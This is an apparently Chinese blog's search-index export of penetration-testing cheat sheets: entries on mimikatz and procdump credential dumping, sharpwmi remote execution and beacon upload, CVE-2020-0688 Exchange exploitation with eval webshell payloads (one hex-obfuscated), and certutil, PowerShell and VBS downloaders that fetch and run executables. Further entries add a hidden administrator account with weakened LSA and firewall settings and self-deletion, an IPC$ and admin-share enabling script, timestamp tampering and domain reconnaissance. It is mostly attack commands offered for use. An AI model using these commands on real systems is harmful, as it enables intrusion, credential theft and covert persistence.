      <title>工具使用说明</title>
      <link href="/2020/04/14/tools-usage/"/>
      <url>/2020/04/14/tools-usage/</url>
      
        <content type="html"><![CDATA[<h2 id="0、vuln-tools"><a href="#0、vuln-tools" class="headerlink" title="0、vuln-tools"></a>0、vuln-tools</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> <span class="built_in">exit</span> &gt;password.txt</span><br></pre></td></tr></table></figure><h2 id="2、penetration-tools"><a href="#2、penetration-tools" class="headerlink" title="2、penetration-tools"></a>2、penetration-tools</h2><h3 id="2-5、DomainTools"><a href="#2-5、DomainTools" class="headerlink" title="2.5、DomainTools"></a>2.5、DomainTools</h3><h4 id="2-5-8、sharpwmi-exe"><a href="#2-5-8、sharpwmi-exe" class="headerlink" title="2.5.8、sharpwmi.exe"></a>2.5.8、sharpwmi.exe</h4><p><font size=3>使用说明: 通过135端口远程执行命令、上传文件等，依赖powershell、不依赖139和445端口，原理是将内容存储在对方机器注册表中，所以最长不能超过512kb</font><br><font size=3>使用方法: <a href="https://github.com/QAX-A-Team/sharpwmi" target="_blank" rel="noopener">ref</a></font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sharpwmi.exe 192.168.2.3 administrator 123 cmd whoami  <span class="comment">#执行命令</span></span><br><span class="line">sharpwmi.exe 192.168.2.3 administrator 123 upload beacon.exe c:\beacon.exe   <span class="comment">#上传文件</span></span><br></pre></td></tr></table></figure><h2 id="3、setup-tools"><a href="#3、setup-tools" class="headerlink" title="3、setup-tools"></a>3、setup-tools</h2>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PowerShell常用命令</title>
      <link href="/2020/04/14/PowerShell/"/>
      <url>/2020/04/14/PowerShell/</url>
      
        <content type="html"><![CDATA[<h2 id="1、文件命令"><a href="#1、文件命令" class="headerlink" title="1、文件命令"></a>1、文件命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.1、搜索文件:</span><br><span class="line">powershell /<span class="built_in">command</span> <span class="string">"Get-ChildItem -Recurse  -Include web.config | foreach-object &#123;<span class="variable">$key</span>=Get-Content <span class="variable">$_</span>;if(<span class="variable">$key</span> -match 'targetcontent')&#123;echo <span class="variable">$_</span>.fullname&#125;&#125;"</span></span><br><span class="line">1.2、修改文件内容：</span><br><span class="line">powershell /<span class="built_in">command</span> <span class="string">"Get-Content  'web.config' | %&#123;Write-Output <span class="variable">$_</span>.Replace('src-content','dst-content')&#125;|out-file -Encoding utf8 -filepath web.config.txt"</span></span><br><span class="line">1.3、修改文件时间：</span><br><span class="line">powershell /<span class="built_in">command</span> <span class="string">"ls web.config | foreach-object&#123;<span class="variable">$_</span>.LastWriteTime='11/09/2015  01:20:02'; <span class="variable">$_</span>.CreationTime='11/09/2015 01:20:02'&#125;"</span></span><br></pre></td></tr></table></figure><h2 id="2、查看自启动："><a href="#2、查看自启动：" class="headerlink" title="2、查看自启动："></a>2、查看自启动：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl</span><br><span class="line">Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span><br><span class="line">Get-ItemProperty -Path &#39;Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span><br><span class="line">Get-ItemProperty -Path &#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&#39;</span><br><span class="line">Get-ItemProperty -Path &#39;Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&#39;</span><br><span class="line">Get-ChildItem &quot;C:\Users\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="line">Get-ChildItem &quot;C:\Users\$env:USERNAME\Start Menu\Programs\Startup&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Command </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0688</title>
      <link href="/2020/04/14/CveTips/"/>
      <url>/2020/04/14/CveTips/</url>
      
        <content type="html"><![CDATA[<h2 id="1、CVE-2020-0688"><a href="#1、CVE-2020-0688" class="headerlink" title="1、CVE-2020-0688"></a>1、CVE-2020-0688</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.1、验证漏洞是否存在：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.2/owa -u admin -p password -c <span class="string">"cmd /c ping xxx.dnslog.cn"</span></span><br><span class="line">1.2、绝对路径写入网马：</span><br><span class="line">python cve-2020-0688.py  -s https://127.0.0.2/owa -u admin -p password -c <span class="string">"cmd /c echo ^&lt;% @Page Language=\\\"Jscript\\\"%^&gt;^&lt;%eval(Request.Item[\\\"password\\\"],\\\"unsafe\\\");%^&gt;  &gt;\"\"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\""</span></span><br><span class="line">1.3、相对路径写入网马：</span><br><span class="line">python cve-2020-0688.py  -s https://127.0.0.2/owa  -u admin -p password  -c   <span class="string">"cmd /c echo ^&lt;%@PAGE LANGUAGE=JSCRIPT%^&gt;^&lt;%var PAY:String=Request[\\\"\x61\x61\x61\x61\\\"];eval(PAY,\\\"\x75\x6E\x73\x61\\\"+\\\"\x66\x65\\\");%^&gt;  &gt;\"\"%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\""</span></span><br><span class="line">1.4、网盘路径写入网马：</span><br><span class="line">python cve-2020-0688.py  -s https://127.0.0.2/owa  -u admin  -p password  -c   <span class="string">"cmd /c echo ^&lt;%@PAGE LANGUAGE=JSCRIPT%^&gt;^&lt;%var PAY:String=Request[\\\"\x61\x61\x61\x61\\\"];eval(PAY,\\\"\x75\x6E\x73\x61\\\"+\\\"\x66\x65\\\");%^&gt;  &gt;\"\"\\127.0.0.1\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\""</span></span><br><span class="line">1.6、验证文件是否存在：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.2/owa  -u admin  -p password -c   <span class="string">"cmd /c dir \"\"%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\" | findstr bytes &amp;&amp; ping 1111.dnslog.cn || ping 2222.dnslog.cn"</span></span><br><span class="line">1.7、certutil写文件：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.1/owa  -u admin -p password -c  <span class="string">"cmd /c certutil -urlcache -split -f http://127.0.0.2:80/1.txt 1.txt"</span></span><br><span class="line">1.8、powershell-wget写文件：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.1/owa  -u admin -p password -c  <span class="string">"cmd /c powershell -Command wget -Uri "</span>http://127.0.0.2:80/1.exe<span class="string">" -OutFile 1.exe"</span></span><br><span class="line">1.9、powershell-object写文件：</span><br><span class="line">python3 cve-2020-0688.py  -s https://127.0.0.1/owa -u admin -p password -c <span class="string">"cmd /c powershell (new-object System.Net.WebClient).DownloadFile('http://127.0.0.2:80/2.exe','2.exe')"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实用命令</title>
      <link href="/2020/04/13/hello-world/"/>
      <url>/2020/04/13/hello-world/</url>
      
        <content type="html"><![CDATA[<h2 id="1、REG常用命令"><a href="#1、REG常用命令" class="headerlink" title="1、REG常用命令"></a>1、REG常用命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###1.1、添加、删除、查询、导出注册表：</span></span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /v systray /t REG_SZ /d <span class="string">"%SystemRoot%\system32\systray.exe"</span> /f</span><br><span class="line">reg query <span class="string">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> </span><br><span class="line">reg delete <span class="string">"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\TrayNotify"</span> /v IconStreams /f</span><br><span class="line">reg compare <span class="string">"hkcu\software\microsoft\winmine"</span> <span class="string">"hkcu\software\microsoft\winmine"</span> /od /s</span><br><span class="line">reg copy <span class="string">"hkcu\software\microsoft\winmine"</span> <span class="string">"hkcu\software\microsoft\winminebk"</span> /s /f</span><br><span class="line">reg <span class="built_in">export</span> <span class="string">"hkcu\software\microsoft\winmine"</span> c:\data\regbackups\wmbkup.reg</span><br><span class="line"></span><br><span class="line"><span class="comment">###1.2、添加、删除DLL服务：</span></span><br><span class="line">net stop appmgmt</span><br><span class="line">reg add  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt /v Start     /t REG_DWORD /d 2 /f</span><br><span class="line">reg add  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt /v ImagePath /t REG_EXPAND_SZ /d <span class="string">"%SystemRoot%\sysWOW64\svchost.exe -k netsvcs"</span> /f</span><br><span class="line">reg add  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AppMgmt\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\sysWOW64\AppMgnts.dll /f</span><br><span class="line">net start appmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment">###1.3、添加、删除EXE服务:</span></span><br><span class="line">sc create test_sevrer binpath= <span class="string">"D:\test_sevrer\test_sevrer.exe"</span> start= auto </span><br><span class="line">sc create PolicyAgent binpath= <span class="string">"C:\WINDOWS\system32\lsass.exe"</span> <span class="built_in">type</span>= share start= auto displayname= <span class="string">"IPSEC Services"</span> depend= RPCSS/Tcpip/IPSec </span><br><span class="line">可通过下面BAT文件：</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">SET ServerName=coderserver</span><br><span class="line">SET ServerExeFile=%ServerName%.exe</span><br><span class="line">sc create %ServerName% binPath= <span class="string">"%~dp0%ServerExeFile%"</span> start= auto</span><br><span class="line">sc config %ServerName% <span class="built_in">type</span>= interact <span class="built_in">type</span>= own</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"%~dp0%ServerExeFile%"</span></span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line"><span class="comment">###1.4、添加、删除EXE服务:</span></span><br><span class="line"><span class="built_in">set</span> s32=C:\<span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> service_name=TestSer1</span><br><span class="line"><span class="built_in">set</span> prog_path=C:\<span class="built_in">test</span></span><br><span class="line"><span class="built_in">set</span> prog_name=bb.bat</span><br><span class="line">%s32%\instsrv.exe %service_name% %s32%\srvany.exe</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\%service_name%\Parameters"</span> /v Application /t REG_SZ /d <span class="string">"%prog_path%\%prog_name%"</span> /f</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\%service_name%\Parameters"</span> /v AppDirectory /t REG_SZ /d <span class="string">"%prog_path%"</span> /f</span><br></pre></td></tr></table></figure><h2 id="2、远程命令执行"><a href="#2、远程命令执行" class="headerlink" title="2、远程命令执行"></a>2、远程命令执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">at          \\127.0.0.1  7:03  c:\windows\test.exe</span><br><span class="line">schtasks    /create  /s 127.0.0.1  /tn <span class="string">"tname"</span> /tr  c:\windows\test.exe  /sc daily /st 07:17:00 /ed 2100/12/31</span><br><span class="line">psexec.exe  -accepteula //127.0.0.1 /u admin /p 123 -s -d  <span class="string">"c:\windows\test.exe"</span></span><br><span class="line">wmic        /node:<span class="string">"PC-HQ-101856"</span> /user:admin /password:123 process call create <span class="string">"c:\windows\test.exe"</span></span><br><span class="line">powershell /<span class="built_in">command</span> <span class="variable">$Username</span> = <span class="string">'admin'</span>;<span class="variable">$Password</span> = <span class="string">'123'</span>;<span class="variable">$pass</span> = ConvertTo-SecureString -AsPlainText <span class="variable">$Password</span> -Force;<span class="variable">$Cred</span> = New-Object System.Management.Automation.PSCredential -ArgumentList <span class="variable">$Username</span>,<span class="variable">$pass</span>;Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock &#123; cmd /c ping google.com -n 2&#125; -credential <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure><h2 id="3、信息搜集"><a href="#3、信息搜集" class="headerlink" title="3、信息搜集"></a>3、信息搜集</h2><h3 id="3-1、基本信息搜集"><a href="#3-1、基本信息搜集" class="headerlink" title="3.1、基本信息搜集"></a>3.1、基本信息搜集</h3><pre><code>whoami                                   # 查看当前用户set                                      # 查看环境变量net user                                 # 查看所有用户query                                    # 查看当前在线用户ipconfig /all                            # 查看当前主机的主机名/IP/DNS等信息route print                              # 查看路由表信息netstat -ano                             # 查看端口开放情况arp -a                                   # 查看arp解析情况tasklist /svc                            # 查看进程及对应服务名net localgroup administrators            # 查看管理员组成员systeminfo                               # 查看系统信息含补丁信息net use                                  # 查看ipc连接情况net view                                 # 查看匿名共享情况net share                                # 查看共享文件夹net localgroup administrators            # 查看本地管理员netsh firewall show state                # 查看防火墙状态netsh firewall show config               # 查看防火墙配置cmdkey /l                                # 查看当前保存的登陆凭证dir %APPDATA%\Microsoft\Windows\Recent   # 查看最近打开的文档netsh wlan show profiles                 # 查看连接过的wifi名称netsh interface show interface           # 查看网络接口wmic startup list brief                  # 查看自启动项dir /a %userprofile%\AppData\Local\Microsoft\Credentials* # 查看RDP连接凭证</code></pre><h3 id="3-2、连通性"><a href="#3-2、连通性" class="headerlink" title="3.2、连通性"></a>3.2、连通性</h3><pre><code>ping     www.google.com             # ICMP连通性nslookup www.google.com             # DNS连通性curl     https://www.google.com     # http连通性nc ip port                          # TCP连通性</code></pre><h3 id="3-3、域信息搜集"><a href="#3-3、域信息搜集" class="headerlink" title="3.3、域信息搜集"></a>3.3、域信息搜集</h3><pre><code>net config workstation                      # 查看当前登录域net user /domain                            # 获得所有域用户列表net view /domain                            # 查看所有的域net view /domain:XXX                        # 查看域内某台主机详情net group /domain                           # 查看所有域用户组列表net group &quot;domain computers&quot; /domain        # 查看域内所有的主机名net group &quot;domain admins&quot; /domain           # 查看所有域管理员net group &quot;domain controllers&quot; /domain      # 查看所有域控制器net group &quot;enterprise admins&quot; /domain       # 查看所有企业管理员nltest /domain_trusts                       # 获取域信任信息net time /domain                            # 查看当前登录域net accounts /domain                        # 查看域密码策略dsquery server                              # 寻找目录中的域控制器setspn.exe -T xx.xx.xx.xx -Q /              # 查看当前域内所有spn</code></pre><h2 id="4、添加隐藏用户、计划任务、更新组策略："><a href="#4、添加隐藏用户、计划任务、更新组策略：" class="headerlink" title="4、添加隐藏用户、计划任务、更新组策略："></a>4、添加隐藏用户、计划任务、更新组策略：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">net user HelpSuport /del /y</span><br><span class="line">net user HelpSuport$ password /add /y</span><br><span class="line">net localgroup Administrators HelpSuport$ /add /y</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"</span> /v <span class="string">"HelpSuport$"</span> /t REG_DWORD /d 0 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Lsa"</span> /v <span class="string">"forceguest"</span> /t REG_DWORD /d 0 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Control\Lsa"</span> /v <span class="string">"LmCompatibilityLevel"</span> /t REG_DWORD /d 0 /f</span><br><span class="line">reg add <span class="string">"HKLM\software\microsoft\windows\currentversion\policies\system"</span> /v <span class="string">"LocalAccountTokenFilterPolicy"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">cmd /c netsh advfirewall firewall <span class="built_in">set</span> rule group=<span class="string">"File and Printer Sharing"</span> new <span class="built_in">enable</span>=Yes</span><br><span class="line">cmd /c reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\Services\FileAndPrint"</span> /v <span class="string">"Enabled"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile\Services\FileAndPrint"</span> /v <span class="string">"RemoteAddresses"</span> /t REG_SZ /d * /f</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\Services\FileAndPrint"</span> /v <span class="string">"Enabled"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">reg add <span class="string">"HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile\Services\FileAndPrint"</span> /v <span class="string">"RemoteAddresses"</span> /t REG_SZ /d * /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\Schedule"</span> /v <span class="string">"Start"</span> /t REG_DWORD /d 2 /f</span><br><span class="line">sc start Schedule</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer"</span> /v <span class="string">"Start"</span> /t REG_DWORD /d 2 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> /v <span class="string">"AutoShareServer"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">reg add <span class="string">"HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> /v <span class="string">"AutoShareWks"</span> /t REG_DWORD /d 1 /f</span><br><span class="line">sc start LanmanServer</span><br><span class="line">gpupdate /force /<span class="built_in">wait</span>:0</span><br><span class="line">del %0</span><br></pre></td></tr></table></figure><h2 id="5、打开IPC"><a href="#5、打开IPC" class="headerlink" title="5、打开IPC$:"></a>5、打开IPC$:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">net start lanmanServer</span><br><span class="line">netsh firewall set portopening TCP 139 ENABLE</span><br><span class="line">netsh firewall set portopening TCP 445 ENABLE</span><br><span class="line">netsh firewall set portopening UDP 137 ENABLE</span><br><span class="line">netsh firewall set portopening UDP 138 ENABLE</span><br><span class="line">netsh firewall set icmpsetting all ENABLE</span><br><span class="line"></span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;forceguest&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;limitblankpassworduse&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;restrictanonymous&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa&quot; &#x2F;v &quot;restrictanonymoussam&quot; &#x2F;t REG_DWORD &#x2F;d &quot;0&quot; &#x2F;f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System&quot; &#x2F;v &quot;LocalAccountTokenFilterPolicy&quot; &#x2F;t REG_DWORD &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line"></span><br><span class="line">net user admin &#x2F;active &#x2F;yes</span><br><span class="line">net user administrator &#x2F;active &#x2F;yes</span><br><span class="line">net share IPC$</span><br><span class="line">net share C$&#x3D;C:\</span><br><span class="line">net share ADMIN$&#x3D;C:\WINDOWS</span><br></pre></td></tr></table></figure><h2 id="6、VBS下载者："><a href="#6、VBS下载者：" class="headerlink" title="6、VBS下载者："></a>6、VBS下载者：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Set Post = CreateObject(<span class="string">"Msxml2.XMLHTTP"</span>)</span><br><span class="line">Set Shell = CreateObject(<span class="string">"Wscript.Shell"</span>)</span><br><span class="line">Post.Open <span class="string">"GET"</span>,<span class="string">"http://127.0.0.2/1.exe"</span>,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(<span class="string">"ADODB.Stream"</span>)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile <span class="string">"c:\users\public\1.exe"</span>,2</span><br><span class="line"></span><br><span class="line">wscript.sleep 1000 &gt;&gt;c:\2.vbs</span><br><span class="line">Shell.Run (<span class="string">"c:\users\public\1.exe"</span>)</span><br></pre></td></tr></table></figure><h2 id="7、自启动查询："><a href="#7、自启动查询：" class="headerlink" title="7、自启动查询："></a>7、自启动查询：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get caption,command 2&gt;nul &amp; ^</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2&gt;nul &amp; ^</span><br><span class="line">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2&gt;nul &amp; ^</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run 2&gt;nul &amp; ^</span><br><span class="line">reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot; 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot; 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;%programdata%\Microsoft\Windows\Start Menu\Programs\Startup&quot; 2&gt;nul &amp; ^</span><br><span class="line">dir &#x2F;b &quot;%appdata%\Microsoft\Windows\Start Menu\Programs\Startup&quot; 2&gt;nul</span><br><span class="line">schtasks &#x2F;query &#x2F;fo TABLE &#x2F;nh | findstr &#x2F;v &#x2F;i &quot;disable deshab&quot;</span><br></pre></td></tr></table></figure><h2 id="4、口令获取命令"><a href="#4、口令获取命令" class="headerlink" title="4、口令获取命令"></a>4、口令获取命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###3.1、通过抓取lsass内存获取用户NTLM HASH:</span></span><br><span class="line">procdump32.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span> <span class="string">"sekurlsa::logonPasswords full"</span> <span class="built_in">exit</span> &gt;password.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Command </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
